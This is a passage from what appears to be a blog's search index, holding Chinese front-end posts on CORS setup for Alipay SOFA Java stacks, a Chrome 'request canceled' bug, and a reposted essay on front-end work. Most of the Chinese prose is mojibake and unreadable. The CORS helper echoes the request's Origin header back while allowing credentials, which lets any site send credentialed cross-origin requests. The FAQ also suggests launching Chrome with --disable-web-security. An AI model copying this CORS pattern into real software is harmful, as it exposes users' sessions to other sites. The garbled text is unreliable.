é…ç½®çš„Filteré»˜è®¤åªä¼šå…è®¸é˜¿é‡ŒåŸŸçš„åŸŸåè®¿é—®ï¼Œå¦‚æœéœ€è¦å…è®¸å…¶ä»–åŸŸåè®¿é—®ï¼Œå¯ä»¥åœ¨MERGE-INF/merge-smvc-scheme-default.xmlæ–‡ä»¶ä¸­é…ç½®ä»¥ä¸‹beanè¦†ç›–æ¡†æ¶çš„é»˜è®¤bean: 12345678&lt;bean id=&quot;defaultCorsFilter&quot; class=&quot;com.alipay.sofa.web.mvc.security.filter.DefaultCorsFilter&quot;&gt; &lt;!-- é…ç½®é˜¿é‡ŒåŸŸä¹‹å¤–çš„ç™½åå•ï¼Œåªéœ€è¦å†™urlåç¼€å³å¯ --&gt; &lt;property name=&quot;corsHostWhiteList&quot;&gt; &lt;list&gt; &lt;value&gt;baidu.com&lt;/value&gt; &lt;/list&gt; &lt;/property&gt;&lt;/bean&gt; ä¸åŒ Java æŠ€æœ¯æ ˆé€šè¿‡ filter é…ç½®çš„æ–¹å¼å¯èƒ½ç•¥æœ‰ä¸åŒï¼Œä»¥ HUANYU ä¸ºä¾‹ï¼Œsofaboot 3.1.0ï¼š 12345&lt;parent&gt; &lt;groupId&gt;com.alipay.sofa&lt;/groupId&gt; &lt;artifactId&gt;sofaboot-alipay-dependencies&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt;&lt;/parent&gt; 1ï¼‰å¼•å…¥ä¾èµ–çš„ JAR 12345&lt;dependency&gt; &lt;groupId&gt;com.alipay.common&lt;/groupId&gt; &lt;artifactId&gt;alipay-common-security&lt;/artifactId&gt; &lt;version&gt;1.2.1&lt;/version&gt;&lt;/dependency&gt; 2ï¼‰åœ¨ merge-smvc-scheme-default.xml æ–‡ä»¶ä¸­æ·»åŠ  12345678910111213141516171819&lt;bean id=&quot;defaultCorsFilter&quot; class=&quot;com.alipay.common.security.filter.DefaultCorsFilter&quot;&gt; &lt;property name=&quot;whiteHostList&quot;&gt; &lt;list&gt; &lt;value&gt;&lt;![CDATA[huanyu3.dev.alipay.net]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[huanyu2.dev.alipay.net]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[huanyu.dev.alipay.net]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[huanyu.test.alipay.net]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[paas.alipay.com]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[paas-pre.alipay.com]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[jz.alipay.com]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[jz-pre.alipay.com]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[mob-paas.alipay.com]]&gt;&lt;/value&gt; &lt;value&gt;&lt;![CDATA[mob-paas-pre.alipay.com]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;property name=&quot;customMethods&quot; value=&quot;GET,POST&quot;/&gt; &lt;property name=&quot;customHeads&quot; value=&quot;*&quot;/&gt; &lt;property name=&quot;customCredentials&quot; value=&quot;true&quot;/&gt;&lt;/bean&gt; æ‰‹åŠ¨é…ç½®è·¨åŸŸå¦‚æœä¸Šé¢çš„æ–¹æ³•å¯¹ä½ çš„æŠ€æœ¯æ ˆä¸é€‚ç”¨ï¼ŒåŒæ—¶ nginx åªèƒ½ä¿®æ”¹ 200 è¯·æ±‚çš„æ–¹å¼ä¸èƒ½æ»¡è¶³ä¸šåŠ¡çš„éœ€æ±‚ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ HttpServletResponse æ‰‹åŠ¨æ·»åŠ ä¸Šè¿°è·¨åŸŸçš„ headersï¼Œåœ¨æœ€ç»ˆç»„è£… http è¿”å›ç»“æœå‰(å¦‚ Interceptor ä¸­)è°ƒç”¨ï¼Œä¾‹å¦‚ï¼š 1234567891011import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class HttpErrorResponseUtil &#123; public static void setResponeCorsHeader(HttpServletRequest request, HttpServletResponse response) &#123; response.addHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); response.addHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;POST,GET,OPTIONS,DELETE,PUT,HEAD,PATCH&quot;); response.addHeader(&quot;Access-Control-Allow-Origin&quot;, request.getHeader(&quot;Origin&quot;)); response.addHeader(&quot;Access-Control-Allow-Headers&quot;, request.getHeader(&quot;Access-Control-Request-Headers&quot;)); &#125;&#125; FAQ å¦‚æœæ˜çŸ¥ä¼šè·¨åŸŸï¼Œæœ‰æ²¡æœ‰åŠæ³•ç¦ç”¨æœ¬åœ°çš„å®‰å…¨ç­–ç•¥ï¼Œæ–¹ä¾¿å¼€å‘å’Œè°ƒè¯•ï¼Ÿ 1open -n -a /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --args --user-data-dir=&quot;/tmp/chrome_dev_test&quot; --disable-web-security å¯ä»¥é€šè¿‡ä»¥ä¸Šå‘½ä»¤å¯åŠ¨ä¸€ä¸ªä¸å®‰å…¨çš„ chrome(Mac OS), åœ¨æœ¬åœ°å¼€å‘æ—¶éå¸¸æœ‰ç”¨ï¼Œæ­¤æ¨¡å¼ä¸‹æ‰€æœ‰è¯·æ±‚éƒ½ä¸ä¼šè¢«è·¨åŸŸç­–ç•¥æ‹¦æˆªï¼Œä¸”ä¸ä¼šå‡ºç° provisional header. è·¨åŸŸè¯·æ±‚æ˜¯å¦å¯ä»¥å‘èµ· redirectï¼Ÿ æµè§ˆå™¨å…è®¸è·¨åŸŸçš„ç®€å•è¯·æ±‚è¿›è¡Œé‡å®šå‘ï¼Œä½†æ˜¯è€ƒè™‘åˆ°æµè§ˆå™¨å…¼å®¹æ€§ï¼Œä¸æ¨èè¿›è¡Œå¤šæ¬¡çš„é‡å®šå‘ã€‚å¯¹äº preflight è¯·æ±‚ï¼Œredirect çš„åœ°å€ä¸ä¼šè¢« follow.]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[chrome request canceled é—®é¢˜æ’æŸ¥]]></title>
    <url>%2F2020%2F03%2F11%2FWeb%E5%89%8D%E7%AB%AF%2Fchrome%20request%20canceled%20%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5%2F</url>
    <content type="text"><![CDATA[èƒŒæ™¯æœ€è¿‘åœ¨æ—¥å¸¸ä¸šåŠ¡éœ€æ±‚ä¸­ï¼Œå¶é‡ä¸€ä¸ª resource åŠ è½½ status=canceled çš„é—®é¢˜ã€‚ éœ€æ±‚å¤§è‡´å†…å®¹æ˜¯åœ¨é¡µé¢ä¸Šå¢åŠ ä¸€æ®µå”¤ç«¯è„šæœ¬ï¼Œç›‘å¬é¡µé¢ç‚¹å‡»äº‹ä»¶ï¼Œè¿›è¡Œæ‹‰ç«¯ã€‚ 123document.body.addEventListener(&apos;click&apos;, () =&gt; &#123; schemaJump(schemaUrl);&#125;); è€Œåœ¨æœªå®‰è£… App çš„æ‰‹æœºæµè§ˆå™¨ ã€PC æµè§ˆå™¨ç¯å¢ƒä¸‹ï¼Œæ˜¯æ— æ³•æ‹‰èµ· App çš„ï¼š æ­¤æ—¶æ°å¥½åº•éƒ¨çš„æ¨å“åˆ—è¡¨ä¸­ offer ä¹Ÿæ˜¯é€šè¿‡ç›‘å¬ç‚¹å‡»äº‹ä»¶è¿›è¡Œè·³è½¬çš„ï¼Œç»“æœå‘ç°åŠ å…¥ä»¥ä¸Šå”¤ç«¯è„šæœ¬å offer æ— æ³•ç‚¹å‡»è·³è½¬äº†ï¼ŒChrome Developer Tools å‘ç°ç‚¹å‡»è·³è½¬çš„ request çš„ status=canceledï¼Œä¹Ÿå°±æ˜¯è¢« chrome cancele æ‰äº†ã€‚ åŸå› æ’æŸ¥åœ¨ stackoverflow ä¸Šæ‰¾åˆ°ä»¥ä¸‹å‡ ç§æƒ…å†µ Chrome ä¼šäº§ç”Ÿ cancel request: The DOM element that caused the request to be made got deleted (i.e. an IMG is being loaded, but before the load happened, you deleted the IMG node) You did something that made loading the data unnecessary. (i.e. you started loading a iframe, then changed the src or overwrite the contents) There are lots of requests going to the same server, and a network problem on earlier requests showed that subsequent requests werenâ€™t going to work (DNS lookup error, earlier (same) request resulted e.g. HTTP 400 error code, etc) The event successfully sends the request, but is is canceled then (but processed by the server). The reason is, the elements submit forms on click events, no matter if you make any ajax requests on the same click event. å¾ˆæ˜¾ç„¶æˆ‘ä»¬çš„æƒ…å†µå’Œç¬¬ 4 æ¡åŸºæœ¬å»åˆï¼Œé—®é¢˜å‡ºåœ¨ click äº‹æƒ…ç›‘å¬ä¸Šï¼Œè§£å†³æ–¹æ¡ˆï¼š 1234document.body.addEventListener(&apos;click&apos;, (event) =&gt; &#123; event.preventDefault(); schemaJump(schemaUrl);&#125;); FAQWhat does status=canceled for a resource mean in Chrome Developer Tools?]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æµ…è°ˆï¼šå‰ç«¯å¦‚ä½•èµ‹èƒ½ä¸šåŠ¡]]></title>
    <url>%2F2020%2F02%2F26%2FWeb%E5%89%8D%E7%AB%AF%2F%E6%B5%85%E8%B0%88%EF%BC%9A%E5%89%8D%E7%AB%AF%E5%A6%82%E4%BD%95%E8%B5%8B%E8%83%BD%E4%B8%9A%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªçŸ¥ä¹ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://zhuanlan.zhihu.com/p/62722892 ä½ æ˜¯å¦å¤´ç–¼äºï¼Œæ¯å¤©åšä¸å®Œçš„éœ€æ±‚å’Œæ”¹ä¸å®Œçš„bugï¼Ÿ ä½ æ˜¯å¦å‘æ„ï¼Œæ¯å¤©æ’¸ä¸šåŠ¡ä»£ç ï¼Œæ˜¯å¦èƒ½è·å¾—æŠ€æœ¯æˆé•¿ï¼Ÿ è€Œè¿½æ±‚æˆå°±æ„Ÿçš„ä½ æ˜¯å¦æƒ³è¿‡ï¼Œä½ æ‰€ç¼–å†™çš„ä¸€è¡Œè¡Œä»£ç ï¼Œæ˜¯åœ¨åå¤çš„å˜åŒ–ä¸­è¿…é€Ÿæˆä¸ºé—ç•™ä»£ç ï¼Œè¿˜æ˜¯åŠ©å…¬å¸æ’ä¸Šè…¾é£çš„ç¿…è†€ï¼Œåœ¨ä½ æ­»æˆ‘æ´»çš„æˆ˜åœºä¸Šè„±é¢–è€Œå‡ºï¼Ÿ å› æ­¤æœ¬æ–‡ä¼šå°†ä¸šåŠ¡å’Œå‰ç«¯å…³è”èµ·æ¥è®¨è®ºï¼Œæ¢è®¨ä¸šåŠ¡å‘å±•çš„ä¸åŒæ—¶æœŸï¼Œå‰ç«¯æ‰€èƒ½åšçš„ä¸€äº›äº‹æƒ…ï¼Œæ—¢èƒ½è§£ä¸šåŠ¡çš„å›°æ‰°ï¼Œä¹Ÿè®©å‰ç«¯åŒå­¦ä»¬æ‘†è„±ç å·¥ã€åˆ‡å›¾ä»”çš„å®šä½ã€‚ åƒè¨€ä¸‡è¯­ä¸å¦‚ä¸€å¼ å›¾ï¼Œå…¨æ–‡å®Œã€‚ å¤§è¯¯ï¼Œè¿˜æ˜¯å¾—è¯¦ç»†è¯´è¯´ã€‚ ä¸€ã€åˆå§‹é˜¶æ®µåœ¨ä¸šåŠ¡çš„åˆå§‹é˜¶æ®µï¼Œåœ¨å¸‚åœºå®šä½ã€ç”¨æˆ·è¯‰æ±‚ã€äº§å“é€»è¾‘å·²ç»æ˜ç¡®çš„å‰æä¸‹ï¼Œæ­¤æ—¶ä¸šåŠ¡çš„æ ¸å¿ƒè¯‰æ±‚æ˜¯ ã€å°½å¿«ä¸Šçº¿ã€ï¼Œè¿›è¡Œå¿«é€ŸéªŒè¯å’Œäº§å“è¿­ä»£ï¼Œå½“ç„¶ï¼Œè´¨é‡è¿˜å¾—èƒ½è¿‡å¾—å»ã€‚ æ‰€ä»¥æ­¤æ—¶æŠ€æœ¯åŒå­¦çš„æ–¹æ¡ˆä¾§é‡ç‚¹æ˜¯ï¼š å¿«ã€çˆ½å…ˆè¯´ã€å¿«ã€ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»€ä¹ˆvue/reactéƒ½è§é¬¼å»ï¼Œè€å¤«åªç”¨jQueryä¸€æŠŠæ¢­ï¼ è¿™æ˜¯åé¢æ¡ˆä¾‹ï¼Œè¿™æ ·å°±åªèƒ½é‡æ„ç«è‘¬åœºäº†ï¼Œé¡¹ç›®ä¸Šçº¿å®Œå°±æ‰“åŒ…è¡Œææ»šè›‹â€¦â€¦ æ­¤æ—¶çš„å¿«ï¼ŒæŒ‡çš„æ˜¯ å°½å¯èƒ½å¤ç”¨é›†å›¢/ä¸šå†…æˆç†Ÿçš„æ–¹æ¡ˆã€æ¶æ„ï¼ŒæŒ‰æºä½è‡ªå·±é‡æ–°é€ è½®å­çš„èºåŠ¨ä¸å®‰çš„å¿ƒæƒ…ã€‚ è¿™åˆæ¶‰åŠåˆ°ä¸€ä¸ªé—®é¢˜ï¼šå¦‚ä½•é€‰æ‹©ä¸€ä¸ªé è°±çš„æ–¹æ¡ˆï¼Ÿè¿™æ˜¯ä¸€ä¸ªå¯ä»¥å¦å¼€æ–‡ç« çš„è¯é¢˜ï¼Œä½†å…ˆåœ¨æ­¤ç®€å•è¯´è¯´ æ ¹æ®æˆ‘ä¸ªäººçš„ç»éªŒï¼Œä¸»è¦ä»ç¨³å®šæ€§ã€å¯æ‰©å±•æ€§ã€æ€§èƒ½å»è€ƒè™‘ã€‚ ç¨³å®šæ€§ å¦‚ä½•å»è¯„ä¼°ï¼Ÿå¦‚æœä¸€ä¸ªé¡¹ç›®èƒ½åšåˆ°è¿™å‡ é¡¹ï¼Œæˆ‘æ˜¯æ¯”è¾ƒæ”¾å¿ƒçš„ã€‚ é¡¹ç›®staræ•°å¤š æœ‰å•æµ‹ï¼Œä»£ç è¦†ç›–ç‡90%~95%ä»¥ä¸Š æ–‡æ¡£å®Œå¤‡ï¼Œæœ‰å¸¸è§Q&amp;A issueæœ‰è¾ƒå¿«çš„å¤„ç†æµç¨‹å’Œå‘¨æœŸï¼Œ3å¤©å†…å“åº”ã€1~4å‘¨å†…å…³é—­ã€‚ æœ‰ç¨³å®šçš„ç‰ˆæœ¬æ§åˆ¶ï¼Œä¸è¿›è¡Œä¸å…¼å®¹çš„å‡çº§ï¼Œéè¦ä¸å…¼å®¹å‡çº§çš„è¯ï¼Œå°†è¿ç§»å·¥å…·åšåˆ°æè‡´ã€‚ å¯æ‰©å±•æ€§ å¦‚ä½•è¯„ä¼°ï¼Ÿä¸»è¦æ˜¯æŒ‡èƒ½å¦æ ¹æ®ä¸šåŠ¡orå·²æœ‰æŠ€æœ¯æ–¹æ¡ˆï¼Œè‡ªå®šä¹‰éƒ¨åˆ†å†…å®¹ã€‚ ä¾‹å¦‚ç»„ä»¶åº“ï¼Œæ˜¯å¦èƒ½è‡ªå®šä¹‰ä¸»é¢˜ã€ç»„ä»¶çš„äº‹ä»¶å›è°ƒç­‰ï¼Œå› ä¸ºæœ‰çš„éœ€æ±‚ï¼Œç»„ä»¶é™¤äº†å®Œæˆé»˜è®¤çš„è¡Œä¸ºï¼Œè¿˜éœ€è¦æ‰§è¡Œå…¶ä»–é€»è¾‘å¦‚åŸ‹ç‚¹ï¼› ä¾‹å¦‚å•æµ‹å·¥å…·ï¼Œèƒ½å¦é…ç½®ç™½åå•ï¼Œå› ä¸ºæœ‰ä¸€äº›ä»£ç æ˜¯å…¼å®¹ç‰¹æ®Šåœºæ™¯ï¼Œç¼–å†™ç”¨ä¾‹æ¨¡æ‹Ÿåœºæ™¯çš„æˆæœ¬å®åœ¨æ¯”è¾ƒé«˜ã€‚è¿™ä¸ªä¸»è¦æ˜¯æ ¹æ®æŠ€æœ¯è¯‰æ±‚å’Œç»éªŒè¿›è¡Œåˆ¤æ–­ã€‚ æ€§èƒ½é—®é¢˜ï¼ŒçŸ­æœŸå®¹æ˜“è¢«äººå¿½è§†ï¼Œå› ä¸ºèƒ½è·‘å°±è¡Œï¼Œä½†ä¸€æ—¦åŸ‹ä¸‹éšæ‚£ï¼Œæ—¥åæœ‰å‘å°±æéš¾è§£å†³ã€‚å®¹æ˜“å‡ºç°æ€§èƒ½é—®é¢˜çš„åœ°æ–¹æœ‰ï¼šä»£ç æ„å»ºã€é•¿åˆ—è¡¨/è¡¨æ ¼æ»šåŠ¨ã€å¤§æ•°æ®å›¾è¡¨ã€å¤æ‚åŠ¨ç”»ã€3Då…¨æ™¯æ¸²æŸ“ç­‰ï¼Œå¦‚æœæ‰€åšçš„ä¸šåŠ¡æ¶‰åŠåˆ°è¿™å‡ ä¸ªæ–¹é¢ï¼Œé€‰æ‹©æ–¹æ¡ˆçš„æ—¶å€™å°±è¦ç‰¹åˆ«æ³¨æ„æ€§èƒ½ã€‚ å¦‚æœå®åœ¨å›¾çœäº‹å„¿ï¼Œcreate-react-appã€umiå¼€ç®±å³ç”¨æ¥ä¸€å¥—å°±å®Œäº‹å„¿äº†ã€‚ ã€çˆ½ã€ è¿™ä¸ªå­—æˆ‘çš„ç†è§£æ˜¯ï¼Œä¸€æ¬¾æ–°äº§å“å‡ºç°ï¼Œä¸€å®šéœ€è¦åœ¨ç”¨æˆ·ä½“éªŒoräº¤äº’ä¸Šæœ‰ç»å¯¹é¢†å…ˆå¯¹æ‰‹çš„åœ°æ–¹ã€‚ ä¸€ä¸ªæˆ‘å§‹ç»ˆè®°å¿†çŠ¹æ–°çš„ä¾‹å­ï¼Œå°±æ˜¯ä¹”å¸ƒæ–¯å‘å¸ƒç¬¬ä¸€æ¬¾iPhoneæ—¶ï¼Œæ¼”ç¤ºæ»‘åŠ¨åˆ—è¡¨æ—¶å…¨åœºçš„æƒŠå‘¼ï¼Œä¸€ä¸ªä¹”å¸ƒæ–¯çš„å“¥ä»¬è¯´ï¼šå½“ä½ æ»‘åŠ¨é¡µé¢çš„æ—¶å€™æˆ‘å°±æ¹¿äº†ã€‚ å¦ä¸€ä¸ªå‰ç«¯é¢†åŸŸçš„ä¾‹å­ï¼Œå°±æ˜¯Ant Designã€‚AntDè¢«å¹¿æ³›ä½¿ç”¨ï¼Œå¾ˆå¤§ä¸€éƒ¨åˆ†åŸå› æ˜¯å…¶å‡ºè‰²çš„è§†è§‰è®¾è®¡å’ŒåŠ¨æ•ˆã€‚è‡³ä»Šä¸ºæ­¢ï¼ŒAntDçš„å®˜ç½‘ä»‹ç»ä¸Šä»ç„¶è¯´è¿™æ˜¯ä¸€ä¸ªè®¾è®¡ä½“ç³»ã€‚ æ‰€ä»¥æˆ‘è§‰å¾—ï¼Œä¸€æ¬¾æ–°äº§å“ï¼Œé™¤äº†æä¾›åˆšéœ€ä»·å€¼ï¼Œæœ€å¥½åœ¨ç¾è§‚å’Œæ˜“ç”¨ä¸Šé¢†å…ˆå¯¹æ‰‹ä¸€å¤§æ­¥ï¼Œè™½ç„¶ä¸»è¦è¿˜æ˜¯çœ‹è®¾è®¡å¸ˆå’Œäº§å“çš„åŠŸåº•ï¼Œä½†å‰ç«¯åŒå­¦çš„å®ç°ä¸Šè‡³å°‘ä¸èƒ½æ‹–åè…¿ï¼Œä¸èƒ½åŠ è½½å¤ªæ…¢ã€æ»šåŠ¨å¤ªå¡ã€‚ è“æµ·å¸‚åœºã€åˆšéœ€äº§å“ä¹Ÿè®¸ä¸é‚£ä¹ˆçœ‹é‡è¿™ä¸€ç‚¹ï¼Œä½†æœ‰çš„è“æµ·é—¨æ§›è¾ƒä½ï¼Œå¾ˆå¿«å°±ä¼šè½¬å˜ä¸ºçº¢æµ·ã€‚ è¿˜å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè´¦æˆ·ä½“ç³»çš„å»ºè®¾ï¼ŒåŒ…æ‹¬æ‰“é€šä¸‰æ–¹ç™»å½•ã€å…ç™»ç­‰ï¼ˆå®¢æˆ·ç«¯ç™»å½•æ€é€ä¼ åˆ°h5ï¼‰ï¼Œç½‘ä¸Šä¸å°‘èµ„æ–™ï¼Œæˆ‘å®åœ¨æ²¡è¿™æ–¹é¢ç»éªŒï¼Œå°±ä¸åœ¨æ­¤å¤šå˜´äº†ã€‚ äºŒã€å¿«é€Ÿæ‰©å¼ OKï¼Œå‡è®¾äº§å“å¦‚æœŸä¸Šçº¿ï¼Œæ•°æ®è¹­è¹­ä¸Šæ¶¨ï¼Œçœ‹èµ·æ¥ä¸€åˆ‡éƒ½å¾ˆå®Œç¾ã€‚ ç„¶åé—®é¢˜å°±æ¥äº†ï¼Œä¸šåŠ¡å¼€å§‹æ‰©å¼ ï¼Œå…¬å¸æ–°æ‹›äº†100ä¸ªè¿è¥å’Œ10ä¸ªPDï¼Œä½ ä¼šå‘ç°éœ€æ±‚çªç„¶å°±ç¿»äº†10å€ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ€ä¹ˆåŠï¼Ÿ ç­”æ¡ˆåªæœ‰ä¸€ä¸ªï¼šæï¼ˆjiaï¼‰æ•ˆï¼ˆrenï¼‰ã€‚æ‰€ä»¥è¿™ä¸ªæ—¶æœŸçš„æ ¸å¿ƒæ˜¯ï¼š å¿«ã€ç¨³ææ•ˆæœ€ç®€å•çš„åŠæ³•æ˜¯åŠ äººï¼Œä½†é—®é¢˜æ˜¯ï¼Œè®©éœ€æ±‚ç¿»100å€å®¹æ˜“ï¼Œä½†æ˜¯è®©èƒ½æ¥éœ€æ±‚çš„äººç¿»100å€å¾ˆå›°éš¾ã€‚å°¤å…¶æ˜¯èƒ½å†™å‡ºé è°±ä»£ç çš„å‰ç«¯ä¸å¥½æ‰¾ï¼Œæœ‰çš„æ—¶å€™æ”¹åˆ«äººçš„ä»£ç ï¼Œæ¯”é‡å†™ä¸€éæ›´éº»çƒ¦ã€‚çœ‹è¿‡ã€Šäººæœˆç¥è¯ã€‹çš„åŒå­¦éƒ½çŸ¥é“ï¼ŒåŠ äººå¸¦æ¥çš„æ•ˆç‡æå‡æ˜¯æœ‰ç“¶é¢ˆçš„ï¼Œäººå¹³å‡æ•ˆç‡ä¼šéšç€äººæ•°å¢åŠ è€Œä¸‹é™ã€‚ æ­¤æ—¶å°±éœ€è¦è€ƒè™‘é€šè¿‡æŠ€æœ¯æ‰‹æ®µææ•ˆï¼Œæ²‰æ·€åŸºç¡€ç ”å‘ä½“ç³»ï¼ŒåŒ…æ‹¬ï¼š åŸºç¡€å·¥å…·åº“+ ä¸šåŠ¡å·¥å…·åº“ï¼Œé¿å…é‡å¤å†™ä¸€äº›ç®€å•ä½†æ˜¯å®¹æ˜“å‡ºbugçš„ä¸šåŠ¡é€»è¾‘ã€‚ UIè§„èŒƒ + ç»„ä»¶ä½“ç³»ã€‚UIè§„èŒƒå¾ˆé‡è¦ï¼Œå¦‚æœè®¾è®¡å¸ˆä¸èƒ½è¾¾æˆä¸€è‡´ï¼Œé‚£å‡ºæ¥çš„è§†è§‰ç¨¿å¿…ç„¶æ˜¯åƒå·®ä¸‡åˆ«çš„ï¼Œä½ çš„å…¬å…±ç»„ä»¶ä¹Ÿå°±éš¾ä»¥æ²‰æ·€äº†ã€‚ ç ”å‘å·¥å…·å‡çº§ã€‚ä¸»è¦æœ‰ æ„å»ºæ€§èƒ½ä¼˜åŒ–ã€æ•°æ®mockå·¥å…·ã€ç¯å¢ƒåˆ‡æ¢å·¥å…·ã€çº¿ä¸Šé—®é¢˜æ’æŸ¥å·¥å…·ç­‰ã€‚ é™¤äº†æŠ€æœ¯æ‰‹æ®µï¼Œäººå‘˜çš„æŠ€æœ¯æˆé•¿ä¹Ÿå¾ˆé‡è¦ï¼Œæ¯•ç«ŸæŠ€æœ¯æ–¹æ¡ˆæ˜¯ç”±äººæ¥æ‰§è¡Œçš„ï¼Œä¸ªäººè§‰å¾—å¸¸ç”¨çš„æ–¹å¼æœ‰ï¼š CodeReviewï¼Œå¸®åŠ©æ–°äººå¿«é€Ÿæˆé•¿åˆ°ä¸€å®šæ°´å¹³ï¼Œä¿è¯æ–°äººå¼€å‘ä»£ç çš„å¯ç»´æŠ¤æ€§ã€‚ å†…éƒ¨åˆ†äº«ã€‚åˆ†äº«å¥½ç”¨å·¥å…·ä»¥æå‡ç ”å‘æ•ˆç‡ï¼Œåˆ†äº«åº•å±‚åŸç†é¿å…è¸©æ›´æ·±çš„å‘æµªè´¹å¤§é‡æ—¶é—´ï¼Œä¹Ÿå¯ä»¥åˆ†äº«ä¸€äº›ç¼–ç ã€è°ƒè¯•å°æŠ€å·§ã€‚ å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ä¸ªææ•ˆçš„ç¥æŠ€ï¼Œå°±æ˜¯â€”â€”ç éœ€æ±‚ã€‚ ç éœ€æ±‚ä¹Ÿæ˜¯ä¸€é—¨æŠ€æœ¯æ´»å„¿ï¼Œæœ‰çš„é«˜çº§å·¥ç¨‹å¸ˆç”¨å˜´å°±å°†éœ€æ±‚è§£äº†ã€‚ä½†ä¸æ˜¯æ¯ä¸ªå›¢é˜Ÿéƒ½é‡‡ç”¨æ”¾æƒå¼ç®¡ç†ï¼ˆæ­¤å¤„æ„Ÿè°¢æˆ‘çš„å†ä»»è€æ¿ä»¬ï¼‰ï¼Œç»™ä½ è¶³å¤Ÿçš„æƒåŠ›è‡ªå·±ç éœ€æ±‚å’Œæ’æœŸï¼› æœ‰çš„å…¬å¸é‡‡ç”¨çš„æ˜¯é›†æƒå¼ç®¡ç†ï¼Œåªæœ‰å‰ç«¯leaderèƒ½å¤Ÿç éœ€æ±‚å’Œè¿›è¡Œä»»åŠ¡åˆ†é…ï¼Œä¹Ÿä½¿å¾—ä¸å°‘åŒå­¦è¿™æ–¹é¢èƒ½åŠ›æ²¡æˆé•¿èµ·æ¥ã€‚ é‚£ä¹ˆéœ€æ±‚åˆ°åº•æ€ä¹ˆç ï¼Ÿå¬æˆ‘ç®€å•è¯´ä¸€ä¸‹ï¼Œæ¬¢è¿æ›´å¥½çš„å¥—è·¯ã€‚ é¦–å…ˆï¼Œç«¯æ­£å¿ƒæ€ã€‚ ä½ ç éœ€æ±‚ä¸æ˜¯ä¸ºäº†è‡ªå·±å·æ‡’è¦æ—©ä¸‹ç­ï¼Œä½ ç éœ€æ±‚æ˜¯ä¸ºäº†ä¸šåŠ¡æ•´ä½“æ•ˆç‡çš„æå‡ã€‚ä½ è¦ç çš„æ˜¯æ— æ•ˆéœ€æ±‚ã€é‡å¤éœ€æ±‚ï¼Œå…¬å¸ä¸šåŠ¡çš„æ ¸å¿ƒéœ€æ±‚ä¸èƒ½ç ã€‚ä¸ç„¶ä½ æŠŠå…¬å¸ä¸šåŠ¡éƒ½ç æ­»äº†ï¼Œè‡ªå·±å–è¥¿åŒ—é£å»ï¼Ÿå…¬å¸å¦‚æœè¿æ°”å¥½IPOäº†ï¼Œä½ ä¸ä¹Ÿçˆ½ä¸€æ³¢ï¼Ÿ å…¶æ¬¡ï¼Œå…ˆé—®é—®éœ€æ±‚è§£å†³çš„ä¸šåŠ¡é—®é¢˜æ˜¯ä»€ä¹ˆï¼Ÿ ææ¸…æ¥šè¿™ä¸€ç‚¹ï¼Œå°±èƒ½åˆ¤æ–­ï¼šè¿™ä¸ªéœ€æ±‚çš„ä¼˜å…ˆçº§å¤šé«˜ã€æ˜¯ä¸æ˜¯ä¼ª/é‡å¤éœ€æ±‚ã€æ˜¯å¦æœ‰å…¶ä»–æ–¹å¼æ›¿ä»£è§£å†³ã€‚æ­¤å¤„çš„ä¼ªéœ€æ±‚ï¼Œæ˜¯æŒ‡ä¸èƒ½å®é™…è§£å†³ç”¨æˆ·é—®é¢˜çš„éœ€æ±‚ã€‚ å†å…¶æ¬¡ï¼Œæ•°æ®è¯´è¯ã€‚ ç›¸å…³çš„æ•°æ®æ˜¯æ€ä¹ˆæ ·çš„ï¼Ÿå¦‚ä½•æ¨å¯¼å‡ºä¸šåŠ¡çš„é—®é¢˜æ‰€åœ¨ï¼Ÿåšå®Œè¿™ä¸ªéœ€æ±‚æ•°æ®ä¼šå˜æˆä»€ä¹ˆæ ·ï¼Ÿ æœ€åï¼Œè¿™ä¸ªéœ€æ±‚å¯èƒ½éœ€è¦å“ªäº›ä¸Šä¸‹æ¸¸åˆä½œã€‚æ¶‰åŠå…¶ä»–ç¯èŠ‚çš„éœ€æ±‚ï¼Œä¸€å®šè¦å°†ä¸Šä¸‹æ¸¸æ‹‰åˆ°ä¸€èµ·ï¼Œè€ƒè™‘åˆ°æ‰€æœ‰å¯èƒ½çš„é—®é¢˜ï¼Œç»Ÿä¸€ä¸€ä¸ªæ–¹æ¡ˆï¼Œæ‰èƒ½å®¢è§‚è¯„ä¼°å·¥ä½œé‡ã€‚ æœ€åçš„æœ€åï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„ï¼Œå°†å…±æ€§çš„éœ€æ±‚æ²‰æ·€ï¼Œæ„å»ºç»„ä»¶ä½“ç³»orä¸šåŠ¡æ¨¡å—ä½“ç³»ã€‚æœ‰è¿™ä¸ªæ²‰æ·€ï¼Œæ‰èƒ½æ›´è¿›ä¸€æ­¥ï¼Œå¯¹éœ€æ±‚åšæ”¶æ•›ï¼Œä¾‹å¦‚æ€»ä¸èƒ½è¯´ï¼Œå·²ç»æœ‰ä¸€ä¸ªslideræ¨¡å—äº†ï¼Œä½ 